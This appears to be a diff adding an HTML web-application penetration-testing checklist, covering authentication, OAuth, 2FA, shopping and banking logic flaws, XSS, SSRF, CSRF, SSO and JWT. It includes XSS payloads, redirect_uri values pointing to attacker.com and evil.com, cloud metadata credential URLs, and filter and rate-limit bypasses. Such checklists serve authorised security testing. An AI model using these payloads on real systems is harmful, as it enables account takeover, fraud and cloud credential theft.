+      <li><input type="checkbox"> If self-registration is available and you can choose your username, log in with a series of similar usernames containing small variations between them, such as A, AA, AAA, AAAA, AAAB, AAAC, AABA, and so on. If another user-specific data is submitted at login or stored in user profiles (such as an email address)</li>
+      <li><input type="checkbox"> Check for session cookies and cookie expiration date/time</li>
+      <li><input type="checkbox"> Identify cookie domain scope</li>
+      <li><input type="checkbox"> Check for HttpOnly flag in cookie</li>
+      <li><input type="checkbox"> Check for Secure flag in cookie if the application is over SSL</li>
+      <li><input type="checkbox"> Check for session fixation i.e. value of session cookie before and after authentication</li>
+      <li><input type="checkbox"> Replay the session cookie from a different effective IP address or system to check whether the server maintains the state of the machine or not</li>
+      <li><input type="checkbox"> Check for concurrent login through different machine/IP</li>
+      <li><input type="checkbox"> Check if any user pertaining information is stored in cookie value or not If yes, tamper it with other user's data</li>
+      <li><input type="checkbox"> Failure to Invalidate Session on (Email Change,2FA Activation)</li>
+
+</ul>
+
+<li><span class="caret">Authentication Testing</span>
+    <ul class="nested">
+      <li><input type="checkbox"> Username enumeration</li>
+      <li><input type="checkbox"> Bypass authentication using various SQL Injections on username and password field</li>
+      <li><span class="caret">Lack of password confirmation on</span>
+        <ul class="nested">
+          <li><input type="checkbox"> Change email address</li>
+          <li><input type="checkbox"> Change password</li>
+          <li><input type="checkbox"> Manage 2FA</li>
+          </ul>
+      <li><input type="checkbox"> Is it possible to use resources without authentication? Access violation</li>
+      <li><input type="checkbox"> Check if user credentials are transmitted over SSL or not</li>
+      <li><input type="checkbox"> Weak login function HTTP and HTTPS both are available</li>
+      <li><span class="caret">Test user account lockout mechanism on brute force attack</span>
+      <ul class="nested">
+      <div style="color: inherit; fill: inherit;"><div style="display: flex;"><div spellcheck="true" placeholder=" " data-content-editable-leaf="true" contenteditable="false" style="max-width: 100%; width: 100%; white-space: pre-wrap; word-break: break-word; caret-color: rgb(55, 53, 47); padding: 3px 2px;">Variation : If server blocks instant user requests, then try with time throttle option from intruder and repeat the process again.</div><div style="position: relative; left: 0px;"></div></div></div>
+          <li><input type="checkbox"> Bypass rate limiting by tampering user agent to Mobile User agent</li>
+          <li><input type="checkbox"> Bypass rate limiting by tampering user agent to Anonymous user agent</li>
+          <li><input type="checkbox"> Bypass rate liniting by using null byte</li>
+          </ul>
+      <li><input type="checkbox"> Create a password wordlist using cewl command</li>
+            <li><span class="caret">Test Oauth login functionality</span>
+      <ul class="nested">
+                <li><span class="caret">OAuth Roles</span>
+      <ul class="nested">
+          <li><input type="checkbox"> Resource Owner → User</li>
+          <li><input type="checkbox"> Resource Server → Twitter</li>
+          <li><input type="checkbox"> Client Application → Twitterdeck.com</li>
+           <li><input type="checkbox"> Authorization Server → Twitter</li>
+          <li><input type="checkbox"> client_id → Twitterdeck ID (This is a public, non-secret unique identifier_</li>
+          <li><input type="checkbox"> client_secret → Secret Token known to the Twitter and Twitterdeck to generate access_tokens</li>
+           <li><input type="checkbox"> response_type → Defines the token type e.g (code, token, etc.)</li>
+          <li><input type="checkbox"> scope → The requested level of access Twitterdeck wants</li>
+          <li><input type="checkbox"> redirect_uri → The URL user is redirected to after the authorization is complete</li>
+           <li><input type="checkbox"> state → Main CSRF protection in OAuth can persist data between the user being directed to the authorization server and back again</li>
+          <li><input type="checkbox"> grant_type → Defines the grant_type and the returned token type</li>
+          <li><input type="checkbox"> code → The authorization code twitter generated, will be like ?code= , the code is used with client_id and client_secret to fetch an access_token</li>
+           <li><input type="checkbox"> access_token → The token twitterdeck uses to make API requests on behalf of the user</li>
+          <li><input type="checkbox"> refresh_token → Allows an application to obtain a new access_token without prompting the user</li>
+          
+          </ul>
+          <li><span class="caret">Code Flaws</span>
+        <ul class="nested">
+              <li><input type="checkbox"> Re-Using the code</li>
+      		  <li><input type="checkbox"> Code Predict/Bruteforce and Rate-limit</li>
+              <li><input type="checkbox"> Is the code for application X valid for application Y?</li>
+      		  
+          </ul>
+                <li><span class="caret">Redirect_uri Flaws</span>
+        <ul class="nested">
+            <li><input type="checkbox"> URL isn't validated at all: ?redirect_uri=https://attacker.com</li>
+      <li><input type="checkbox"> Subdomains allowed (Subdomain Takeover or Open redirect on those subdomains): ?redirect_uri=https://sub.twitterdeck.com</li>
+            <li><input type="checkbox"> Host is validated, path isn't Chain open redirect): ?redirect_uri=https://twitterdeck.com/callback?redirectUrl=https://evil.com</li>
+      <li><input type="checkbox"> Host is validated, path isn't (Referer leakages): Include external content on HTML page and leak code via Referer</li>
+            <li><input type="checkbox"> Weak Regexes</li>
+      <li><input type="checkbox"> Bruteforcing the URL encoded chars after host: redirect_uri=https://twitterdeck.com§FUZZ§</li>
+            <li><input type="checkbox"> Bruteforcing the keywords whitelist after host (or on any whitelist open redirect filter): ?redirect_uri=https://§FUZZ§.com</li>
+      <li><input type="checkbox"> URI validation in place: use typical open redirect payloads</li>
+      
+		</ul>
+                <li><span class="caret">State Flaws</span>
+        <ul class="nested">
+            <li><input type="checkbox"> Missing State parameter? (CSRF)</li>
+            <li><input type="checkbox"> Predictable State parameter?</li>
+            <li><input type="checkbox"> Is State parameter being verified?</li>
+		</ul>
+                <li><span class="caret">Misc</span>
+        <ul class="nested">
+      <li><input type="checkbox"> Is client_secret validated?</li>
+      <li><input type="checkbox"> Pre ATO using facebook phone-number signup</li>
+      <li><input type="checkbox"> No email validation Pre ATO</li>
+		</ul>
+	</ul>
+            <li><span class="caret">Test 2FA Misconfiguration</span>
+        <ul class="nested">
+            <li><input type="checkbox"> Response Manipulation</li>
+            <li><input type="checkbox"> Status Code</li>
+            <li><input type="checkbox"> Manipulation</li>
+            <li><input type="checkbox"> 2FA Code Leakage in Response</li>
+            <li><input type="checkbox"> 2FA Code Reusability</li>
+            <li><input type="checkbox"> Lack of Brute-Force Protection</li>
+            <li><input type="checkbox"> Missing 2FA Code Integrity Validation</li>
+            <li><input type="checkbox"> With null or 000000</li>
+		</ul>
+</ul>
+
+<li><span class="caret">My Account (Post Login) Testing</span>
+    <ul class="nested">
+      <li><input type="checkbox"> Find parameter which uses active account user id. Try to tamper it in order to change the details of the other accounts</li>
+      <li><input type="checkbox"> Create a list of features that are pertaining to a user account only. Change Email Change Password -Change account details (Name, Number, Address, etc.) Try CSRF</li>
+      <li><input type="checkbox"> Post login change email id and update with any existing email id. Check if its getting validated on server side or not. Does the application send any new email confirmation link to a new user or not? What if a user does not confirm the link in some time frame?</li>
+      <li><input type="checkbox"> Open profile picture in a new tab and check the URL. Find email id/user id info. EXIF Geolocation Data Not Stripped From Uploaded Images.</li>
+      <li><input type="checkbox"> Check account deletion option if application provides it and confirm that via forgot password feature</li>
+      <li><input type="checkbox"> Change email id, account id, user id parameter and try to brute force other user's password</li>
+      <li><input type="checkbox"> Check whether application re authenticates for performing sensitive operation for post authentication features</li>
+</ul>
+
+<li><span class="caret">Forgot Password Testing</span>
+    <ul class="nested">
+      <li><input type="checkbox"> Failure to invalidate session on Logout and Password reset</li>
+      <li><input type="checkbox"> Check if forget password reset link/code uniqueness</li>
+      <li><input type="checkbox"> Check if reset link does get expire or not if its not used by the user for certain amount of time</li>
+      <li><input type="checkbox"> Find user account identification parameter and tamper Id or parameter value to change other user's password</li>
+      <li><input type="checkbox"> Check for weak password policy</li>
+      <li><input type="checkbox"> Weak password reset implementation Token is not invalidated after use</li>
+      <li><input type="checkbox"> If reset link has another param such as date and time, then. Change date and time value in order to make active & valid reset link</li>
+      <li><input type="checkbox"> Check if security questions are asked? How many guesses allowed? --> Lockout policy maintained or not?</li>
+      <li><input type="checkbox"> Add only spaces in new password and confirmed password. Then Hit enter and see the result</li>
+      <li><input type="checkbox"> Does it display old password on the same page after completion of forget password formality?</li>
+      <li><input type="checkbox"> Ask for two password reset link and use the older one from user's email</li>
+      <li><input type="checkbox"> Check if active session gets destroyed upon changing the password or not?</li>
+      <li><input type="checkbox"> Weak password reset implementation Password reset token sent over HTTP</li>
+      <li><input type="checkbox"> Send continuous forget password requests so that it may send sequential tokens</li>
+      
+</ul>      
+      
+      <li><span class="caret">Contact Us Form Testing</span>
+    <ul class="nested">
+      <li><input type="checkbox"> Is CAPTCHA implemented on contact us form in order to restrict email flooding attacks? Try Captcha Testing & Bypasss</li>
+      <li><input type="checkbox"> Does it allow to upload file on the server?</li>
+      <li><input type="checkbox"> Blind XSS</li>
+      
+      </ul>
+      
+  <li><span class="caret">Product Purchase Testing</span>
+    <ul class="nested">
+      <li><span class="caret">Buy Now</span>
+        <ul class="nested">
+          <li><input type="checkbox"> Tamper product ID to purchase other high valued product with low prize</li>    
+          <li><input type="checkbox"> Tamper product data in order to increase the number of product with the same prize</li>    
+
+  </ul>
+        <li><span class="caret">Gift/Voucher</span>
+        <ul class="nested">
+          <li><input type="checkbox"> Tamper gift/voucher count in the request (if any) to increase/decrease the number of vouchers/gifts to be used</li>
+          <li><input type="checkbox"> Tamper gift/voucher value to increase/decrease the value of the voucher in terms of money. (e.g. $100 is given as a voucher, tamper value to increase, decrease money)</li>
+          <li><input type="checkbox"> Reuse gift/voucher by using old gift values in parameter tampering</li>
+          <li><input type="checkbox"> Check the uniqueness of gift/voucher parameter and try guessing other gift/voucher code</li>
+          <li><input type="checkbox"> Use parameter pollution technique to add the same voucher twice by adding same parameter name and value again with & in the BurpSuite request</li>
+  </ul>
+        <li><span class="caret">Add/Delete Product from Cart</span>
+        <ul class="nested">
+          <li><input type="checkbox"> Tamper user id to delete products from other user's cart</li> 
+           <li><input type="checkbox"> Tamper cart id to add/delete products from other user's cart</li>
+            <li><input type="checkbox"> Identify cart id/user id for cart feature to view the added items from other user's account</li>
+  </ul>
+  <li><span class="caret">Address</span>
+        <ul class="nested">
+          <li><input type="checkbox"> Tamper BurpSuite request to change other user's shipping address to yours</li>
+          <li><input type="checkbox"> Try stored XSS by adding XSS vector on shipping address</li>
+          <li><input type="checkbox"> Use parameter pollution technique to add two shipping address instead of one trying to manipulate application to send same item on two shipping address</li>
+          </ul>
+          <li><span class="caret">Place Order</span>
+        <ul class="nested">
+          <li><input type="checkbox"> Tamper payment options parameter to change the payment method. E.g. Consider some items cannot be ordered for cash on delivery but tampering request parameters from debit/credit/PayPal/net banking option to cash on delivery may allow you to place order for that particular item</li> 
+          <li><input type="checkbox"> Tamper the amount value for payment manipulation in each main and sub requests and responses</li>
+          <li><input type="checkbox"> Check if CVV is going in cleartext or not</li>
+          <li><input type="checkbox"> Check if the application itself processes your card details and then performs a transaction or it calls any third-party payment processing company to perform a transaction</li>
+  
+        
+  </ul>
+        <li><span class="caret">Track Order</span>
+        <ul class="nested">
+          <li><input type="checkbox"> Track other user's order by guessing order tracking number</li>
+          <li><input type="checkbox"> Brute force tracking number prefix or suffix to track mass orders for other users</li>
+  </ul>
+        <li><span class="caret">Wish list page testing</span>
+        <ul class="nested">
+          <li><input type="checkbox"> Check if a user A can add/remote products in Wishlist of other user B’s account</li>
+          <li><input type="checkbox"> Check if a user A can add products into user B’s cart from his/her (user A’s) Wishlist section.</li>
+  </ul>
+        <li><span class="caret">Post product purchase testing</span>
+        <ul class="nested">
+          <li><input type="checkbox"> Check if user A can cancel orders for user B’s purchase</li>  
+          <li><input type="checkbox"> Check if user A can view/check orders already placed by user B</li>
+          <li><input type="checkbox"> Check if user A can modify the shipping address of placed order by user B</li>
+  </ul>
+
+   </ul>
+   
+ <li><span class="caret">Banking Application Testing</span>
+    <ul class="nested">
+      <li><span class="caret">Billing Activity</span>
+        <ul class="nested">
+          <li><input type="checkbox"> Check if user 'A' can view the account statement for user 'B'</li>
+          <li><input type="checkbox"> Check if user 'A' can view the transaction report for user 'B'</li>
+          <li><input type="checkbox"> Check if user 'A' can view the summary report for user 'B'</li>
+          <li><input type="checkbox"> Check if user 'A' can register for monthly/weekly account statement via email behalf of user 'B'</li>         
+          <li><input type="checkbox"> Check if user 'A' can update the existing email id of user 'B' in order to retrieve monthly/weekly account summary</li>
+          </ul>
+                <li><span class="caret">Deposit/Loan/Linked/External Account Checking</span>
+        <ul class="nested">
+          <li><input type="checkbox"> Check if user 'A' can view the deposit account summary of user 'B'</li>
+          <li><input type="checkbox"> Check for account balance tampering for Deposit accounts</li>
+          </ul>
+                <li><span class="caret">Tax Deduction Inquiry Testing</span>
+        <ul class="nested">
+          <li><input type="checkbox"> Check if user 'A' with it's customer id 'a' can see the tax deduction details of user 'B' by tampering his/her customer id 'b'</li>
+          <li><input type="checkbox"> Check parameter tampering for increasing and decreasing interest rate, interest amount, and tax refund</li>
+          <li><input type="checkbox"> Check if user 'A' can download the TDS details of user 'B’</li>
+          </ul>
+          
+      <li><input type="checkbox"> Check if user 'A' can request for the cheque book behalf of user ‘B’.</li>
+         <li><span class="caret">Fixed Deposit Account Testing</span>
+        <ul class="nested">
+          <li><input type="checkbox"> Check if is it possible for user 'A' to open FD account behalf of user 'B'</li>
+          <li><input type="checkbox"> Check if Can user open FD account with the more amount than the current account balance</li>
+          </ul>
+                <li><span class="caret">Stopping Payment on basis of cheque/date range</span>
+        <ul class="nested">
+          <li><input type="checkbox"> Can user 'A' stop the payment of user 'B' via cheque number</li>
+          <li><input type="checkbox"> Can user 'A' stop the payment on basis of date range for user 'B’</li>
+          </ul>
+                <li><span class="caret">Status Enquiry Testing</span>
+        <ul class="nested">
+          <li><input type="checkbox"> Can user 'A' view the status enquiry of user 'B'</li>
+          <li><input type="checkbox"> Can user 'A' modify the status enquiry of user 'B'</li>
+          <li><input type="checkbox"> Can user 'A' post and enquiry behalf of user 'B' from his own account</li>
+          
+          </ul>
+                <li><span class="caret">Fund transfer testing</span>
+        <ul class="nested">
+          <li><input type="checkbox"> Is it possible to transfer funds to user 'C' instead of user 'B' from the user 'A' which was intended to transfer from user 'A' to user 'B'</li>
+          <li><input type="checkbox"> Can fund transfer amount be manipulated?</li>
+          <li><input type="checkbox"> Can user 'A' modify the payee list of user 'B' by parameter manipulation using his/her own account</li>
+          <li><input type="checkbox"> Is it possible to add payee without any proper validation in user 'A' 's own account or to user 'B' 's account</li>
+          </ul>
+                <li><span class="caret">Schedule transfer testing</span>
+        <ul class="nested">
+          <li><input type="checkbox"> Can user 'A' view the schedule transfer of user 'B'</li>
+          <li><input type="checkbox"> Can user 'A' change the details of schedule transfer for user 'B’</li>
+          </ul>
+                <li><span class="caret">Testing of fund transfer via NEFT</span>
+        <ul class="nested">
+          <li><input type="checkbox"> Amount manipulation via NEFT transfer</li>
+          <li><input type="checkbox"> Check if user 'A' can view the NEFT transfer details of user 'B’</li>
+          </ul>
+   </ul>
+          <li><span class="caret">Flight/Railway/Hotel Booking Testing</span>
+    <ul class="nested">
+      <li><input type="checkbox"> Check other user’s e-ticket</li>
+      <li><input type="checkbox"> Get refund behalf of other user</li>
+      <li><input type="checkbox"> Get more refund by changing refund amount</li>
+      <li><input type="checkbox"> Book business/high class ticket by changing parameter value of economy class variable</li>            
+      <li><input type="checkbox"> Book deluxe room by changing parameter value of normal fare</li>
+      <li><input type="checkbox"> Book multiple/seats by changing quantity parameter value for 1 seat/room book</li>
+   </ul>
+    
+    <li><span class="caret">Open Redirection Testing</span>
+    <ul class="nested">
+      <li><span class="caret">Common injection parameters</span>
+        <ul class="nested">
+        <div><div class="line-numbers notion-code-block" style="display: flex; overflow-x: auto;"><div spellcheck="false" autocorrect="off" autocapitalize="off" placeholder=" " data-content-editable-leaf="true" contenteditable="false" style="flex-grow: 1; flex-shrink: 1; text-align: left; font-family: SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace; font-size: 85%; tab-size: 2; padding: 34px 16px 32px 32px; min-height: 1em; color: rgb(55, 53, 47); white-space: pre;"><span class="" data-token-index="0">/{payload}
+?next={payload}
+?url={payload}
+?target={payload}
+?rurl={payload}
+?dest={payload}
+?destination={payload}
+?redir={payload}
+?redirect_uri={payload}
+?redirect_url={payload}
+?redirect={payload}
+/redirect/{payload}
+/cgi-bin/redirect.cgi?{payload}
+/out/{payload}
+/out?{payload}
+?view={payload}
+/login?to={payload}
+?image_url={payload}
+?go={payload}
+?return={payload}
+?returnTo={payload}
+?return_to={payload}
+?checkout_url={payload}
+?continue={payload}
+?return_path={payload}</span><span>
+</span></div></div></div>
+            </ul>
+          <li><input type="checkbox"> Use burp 'find' option in order to find parameters such as URL, red, redirect, redir, origin, redirect_uri, target etc</li>
+          <li><input type="checkbox"> Check the value of these parameter which may contain a URL</li>
+          <li><input type="checkbox"> Change the URL value to www.tushar.com and check if gets redirected or not</li>
+          <li><input type="checkbox"> Try Single Slash and url encoding </li>
+          <li><input type="checkbox"> Using a whitelisted domain or keyword</li>
+          <li><input type="checkbox"> Using // to bypass http blacklisted keyword</li>
+          <li><input type="checkbox"> Using https: to bypass // blacklisted keyword</li>
+          <li><input type="checkbox"> Using \\ to bypass // blacklisted keyword</li>
+          <li><input type="checkbox"> Using \/\/ to bypass // blacklisted keyword</li>
+          <li><input type="checkbox"> Using null byte %00 to bypass blacklist filter</li>
+          <li><input type="checkbox"> Using ° symbol to bypass</li>
+
+       </ul>
+      
+      <li><span class="caret">Host Header Injection</span>
+    <ul class="nested">
+      <li><input type="checkbox"> Supply an arbitrary Host header</li>
+      <li><input type="checkbox"> Check for flawed validation</li>
+      <li><span class="caret">Send ambiguous requests</span>
+        <ul class="nested">
+          <li><input type="checkbox"> Inject duplicate Host headers</li>
+          <li><input type="checkbox"> Supply an absolute URL</li>
+          <li><input type="checkbox"> Add line wrapping</li>
+             </ul>
+<li><input type="checkbox"> Inject host override headers</li>
+             </ul>
+
+      <li><span class="caret">Cross-Site Scripting Testing</span>
+    <ul class="nested">
+      <li><input type="checkbox"> Try XSS using QuickXSS tool by theinfosecguy</li>
+      <li><input type="checkbox"> Upload file using '"&gt;&lt;img src=x onerror=alert(document.domain)&gt;.txt</li>
+      <li><input type="checkbox"> If script tags are banned, use &lt;h1&gt; and other HTML tags</li>
+      <li><input type="checkbox"> If output is reflected back inside the JavaScript as a value of any variable just use alert(1)</li>
+      <li><input type="checkbox"> if " are filtered then use this payload /&gt;&lt;img src=d onerror=confirm(/tushar/);&gt;</li>
+      <li><input type="checkbox"> Upload a JavaScript using Image file</li>
+      <li><input type="checkbox"> Unusual way to execute your JS payload is to change method from POST to GET. It bypasses filters sometimes</li>
+      <li><span class="caret">Tag attribute value</span>
+        <ul class="nested">
+          <li><input type="checkbox"> Input landed -&lt;input type=”text” name=”state” value=”INPUT_FROM_ USER”&gt;</li>
+          <li><input type="checkbox"> Payload to be inserted -“ onfocus=”alert(document.cookie)"</li>
+          </ul>
+          <li><input type="checkbox"> Syntax Encoding payload “%3cscript%3ealert(document.cookie)%3c/script%3e"</li>
+          <li><span class="caret">XSS filter evasion</span>
+        <ul class="nested">
+          <li><input type="checkbox"> &lt; and &gt; can be replace with html entities &amp;lt; and &amp;gt; </li>
+          <li><input type="checkbox"> You can try an XSS polyglot.Eg:-javascript:/<span style="font-style:italic" data-token-index="1" class="notion-enable-hover">-&gt;&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/script&gt;&lt;/xmp&gt;&lt;svg/onload='+/"/+/onmouseover=1/+/[</span>/[]/+alert(1)//'&gt;</li>
+          </ul>
+          
+          </ul>
+          
+          
+          <li><span class="caret">Server-side request forgery (SSRF)</span>
+    <ul class="nested">
+      <li><span class="caret">Common injection parameters</span>
+        <ul class="nested">
+<div><div class="line-numbers notion-code-block" style="display: flex; overflow-x: auto;"><div spellcheck="false" autocorrect="off" autocapitalize="off" placeholder=" " data-content-editable-leaf="true" contenteditable="false" style="flex-grow: 1; flex-shrink: 1; text-align: left; font-family: SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace; font-size: 85%; tab-size: 2; padding: 34px 16px 32px 32px; min-height: 1em; color: rgb(55, 53, 47); white-space: pre;"><span class="" data-token-index="0">"access=", 
+"admin=", 
+"dbg=", 
+"debug=", 
+"edit=", 
+"grant=", 
+"test=", 
+"alter=", 
+"clone=", 
+"create=", 
+"delete=", 
+"disable=", 
+"enable=", 
+"exec=", 
+"execute=", 
+"load=", 
+"make=", 
+"modify=", 
+"rename=", 
+"reset=", 
+"shell=", 
+"toggle=", 
+"adm=", 
+"root=", 
+"cfg=",
+"dest=", 
+"redirect=", 
+"uri=", 
+"path=", 
+"continue=", 
+"url=", 
+"window=", 
+"next=", 
+"data=", 
+"reference=", 
+"site=", 
+"html=", 
+"val=", 
+"validate=", 
+"domain=", 
+"callback=", 
+"return=", 
+"page=", 
+"feed=", 
+"host=", 
+"port=", 
+"to=", 
+"out=",
+"view=", 
+"dir=", 
+"show=", 
+"navigation=", 
+"open=",
+"file=",
+"document=",
+"folder=",
+"pg=",
+"php_path=",
+"style=",
+"doc=",
+"img=",
+"filename="</span><span>
+</span></div></div></div>
+          </ul>
+      <li><span class="caret">Finding hidden attack surface</span>
+        <ul class="nested">
+          <li><input type="checkbox"> Partial URLs in requests</li>
+          <li><input type="checkbox"> URLs within data formats</li>
+                <li><input type="checkbox"> SSRF via the Referer header</li>
+          </ul>
+                <li><input type="checkbox"> Try basic localhost payloads</li>
+                <li><span class="caret">Bypassing filters</span>
+        <ul class="nested">
+          <li><input type="checkbox"> Bypass using HTTPS</li>
+          <li><input type="checkbox"> Bypass with [::]</li>
+          <li><input type="checkbox"> Bypass with a domain redirection</li>
+          <li><input type="checkbox"> Bypass using a decimal IP location</li>
+          <li><input type="checkbox"> Bypass using IPv6/IPv4 Address Embedding</li>
+          <li><input type="checkbox"> Bypass using malformed urls</li>
+          <li><input type="checkbox"> Bypass using rare address(short-hand IP addresses by dropping the zeros)</li>
+                <li><input type="checkbox"> Bypass using enclosed alphanumerics</li>
+
+          
+            </ul>
+            <li><span class="caret">Cloud Instances</span>
+        <ul class="nested">
+        <li><span class="caret">AWS</span>
+        <ul class="nested">
+        <div><div class="line-numbers notion-code-block" style="display: flex; overflow-x: auto;"><div spellcheck="false" autocorrect="off" autocapitalize="off" placeholder=" " data-content-editable-leaf="true" contenteditable="false" style="flex-grow: 1; flex-shrink: 1; text-align: left; font-family: SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace; font-size: 85%; tab-size: 2; padding: 34px 16px 32px 32px; min-height: 1em; color: rgb(55, 53, 47); white-space: pre;"><span class="" data-token-index="0">http://instance-data
+http://169.254.169.254
+http://169.254.169.254/latest/user-data
+http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
+http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
+http://169.254.169.254/latest/meta-data/ami-id
+http://169.254.169.254/latest/meta-data/reservation-id
+http://169.254.169.254/latest/meta-data/hostname
+http://169.254.169.254/latest/meta-data/public-keys/
+http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
+http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
+http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
+http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access
+http://169.254.169.254/latest/dynamic/instance-identity/document</span><span>
+</span></div></div></div>
+        </ul>
+        <li><span class="caret">Google Cloud</span>
+        <ul class="nested">
+        <div><div class="line-numbers notion-code-block" style="display: flex; overflow-x: auto;"><div spellcheck="false" autocorrect="off" autocapitalize="off" placeholder=" " data-content-editable-leaf="true" contenteditable="false" style="flex-grow: 1; flex-shrink: 1; text-align: left; font-family: SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace; font-size: 85%; tab-size: 2; padding: 34px 16px 32px 32px; min-height: 1em; color: rgb(55, 53, 47); white-space: pre;"><span class="" data-token-index="0">http://169.254.169.254/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/hostname
+http://metadata.google.internal/computeMetadata/v1/instance/id
+http://metadata.google.internal/computeMetadata/v1/project/project-id</span><span>
+</span></div></div></div>
+        </ul>
+        <li><span class="caret">Digital Ocean</span>
+        <ul class="nested">
+        <div><div class="line-numbers notion-code-block" style="display: flex; overflow-x: auto;"><div spellcheck="false" autocorrect="off" autocapitalize="off" placeholder=" " data-content-editable-leaf="true" contenteditable="false" style="flex-grow: 1; flex-shrink: 1; text-align: left; font-family: SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace; font-size: 85%; tab-size: 2; padding: 34px 16px 32px 32px; min-height: 1em; color: rgb(55, 53, 47); white-space: pre;"><span class="" data-token-index="0">curl http://169.254.169.254/metadata/v1/id
+http://169.254.169.254/metadata/v1.json
+http://169.254.169.254/metadata/v1/ 
+http://169.254.169.254/metadata/v1/id
+http://169.254.169.254/metadata/v1/user-data
+http://169.254.169.254/metadata/v1/hostname
+http://169.254.169.254/metadata/v1/region
+http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address</span><span>
+</span></div></div></div>
+        </ul>
+        <li><span class="caret">Azure</span>
+        <ul class="nested">
+        <div><div class="line-numbers notion-code-block" style="display: flex;"><div spellcheck="false" autocorrect="off" autocapitalize="off" placeholder=" " data-content-editable-leaf="true" contenteditable="false" style="flex-grow: 1; flex-shrink: 1; text-align: left; font-family: SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace; font-size: 85%; tab-size: 2; padding: 34px 16px 32px 32px; min-height: 1em; color: rgb(55, 53, 47); white-space: pre-wrap; word-break: break-all; min-width: 0px;">http://169.254.169.254/metadata/v1/maintenance
+http://169.254.169.254/metadata/instance?api-version=2017-04-02
+http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&amp;format=text</div></div></div>
+        </ul>
+
+        </ul>
+        <li><input type="checkbox"> Bypassing via open redirection</li>
+        <li><input type="checkbox"> Blind SSRF</li>        
+        </ul>  
+        
+        <li><span class="caret">CSRF Testing</span>
+    <ul class="nested">
+      <li><span class="caret">Application has Anti-CSRF token implemented</span>
+        <ul class="nested">
+          <li><input type="checkbox"> Removing the Anti-CSRF Token</li>
+          <li><input type="checkbox"> Altering the Anti-CSRF Token</li>
+          <li><input type="checkbox"> Using the Attacker’s Anti-CSRF Token</li>
+          <li><input type="checkbox"> Spoofing the Anti-CSRF Token</li>
+          <li><input type="checkbox"> Using guessable Anti-CSRF Tokens</li>
+          <li><input type="checkbox"> Stealing Anti-CSRF Tokens</li>
+          </ul>
+                <li><span class="caret">Application uses Double Submit Cookie</span>
+        <ul class="nested">
+          <li><input type="checkbox"> Check for session fixation on subdomains</li>
+          <li><input type="checkbox"> Man in the the middle attack</li>
+         
+          </ul>
+                <li><span class="caret">Application validates the Referrer or the Origin of the request received</span>
+        <ul class="nested">
+          <li><input type="checkbox"> Restricting the CSRF POC from sending the Referrer header</li>
+          <li><input type="checkbox"> Bypass the whitelisting/blacklisting mechanism used by the application</li>
+          </ul>
+                <li><span class="caret">Sending data in JSON/XML format</span>
+        <ul class="nested">
+          <li><input type="checkbox"> By using normal HTML Form1</li>
+          <li><input type="checkbox"> By using normal HTML Form2 (By Fetch Request)</li>
+          <li><input type="checkbox"> By using XMLHTTP Request/AJAX request</li>
+          <li><input type="checkbox"> By using Flash file</li>
+          </ul>
+          </ul>
+          
+          <li><span class="caret">SSO Vulnerabilities</span>
+    <ul class="nested">
+      <li><input type="checkbox"> If internal.company.com Redirects You To SSO e.g. auth.company.com, Do FUZZ
+On Internal.company.com</li>
+      <li><input type="checkbox"> If company.com/internal Redirects You To SSO e.g. Google login, Try To Insert public Before internal e.g. company.com/public/internal To Gain Access Internal</li>
+      <li><input type="checkbox"> Try To Craft SAML Request With Token And Send It To The Server And Figure
+Out How Server Interact With This</li>
+      <li><input type="checkbox"> If There Is AssertionConsumerServiceURL In Token Request Try To Insert Your
+Domain e.g. http://me.com As Value To Steal The Token</li>
+      <li><input type="checkbox"> If There Is AssertionConsumerServiceURL In Token Request Try To Do FUZZ
+On Value Of AssertionConsumerServiceURL If It Is Not Similar To Origin</li>
+      <li><input type="checkbox"> If There Is Any UUID, Try To Change It To UUID Of Victim Attacker e.g. Email Of
+Internal Employee Or Admin Account etc</li>
+      <li><input type="checkbox"> Try To Figure Out If The Server Vulnerable To XML Signature Wrapping OR Not?</li>
+      <li><input type="checkbox"> Try To Figure Out If The Server Checks The Identity Of The Signer OR Not?</li>
+      <li><input type="checkbox"> Try To Inject XXE Payloads At The Top Of The SAML Response</li>
+      <li><input type="checkbox"> Try To Inject XSLT Payloads Into The Transforms Element As A Child
+Node Of The SAML Response</li>
+      <li><input type="checkbox"> If Victim Can Accept Tokens Issued By The Same Identity Provider That Services
+Attacker, So You Can Takeover Victim Account</li>
+      <li><input type="checkbox"> While Testing SSO Try To search In Burp Suite About URLs In Cookie Header e.g.
+Host=IP; If There Is Try To Change IP To Your IP To Get SSRF</li>
+      </ul>
+          
+          <li><span class="caret">Cross-origin resource sharing (CORS)</span>
+    <ul class="nested">
+      <li><input type="checkbox"> Errors parsing Origin headers</li>
+      <li><input type="checkbox"> Whitelisted null origin value</li>
+      </ul>
+      
+      
+      <li><span class="caret">JWT Token Testing</span>
+    <ul class="nested">
+      <li><input type="checkbox"> Brute-forcing secret keys</li>
+      <li><input type="checkbox"> Signing a new token with the “none” algorithm</li>
+      <li><input type="checkbox"> Changing the signing algorithm of the token (for fuzzing purposes)</li>
+      <li><input type="checkbox"> Signing the asymmetrically-signed token to its symmetric algorithm match (when you have the original public key)</li>
+      <li><input type="checkbox"> (CVE-2015-2951) The alg=none signature-bypass vulnerability</li>
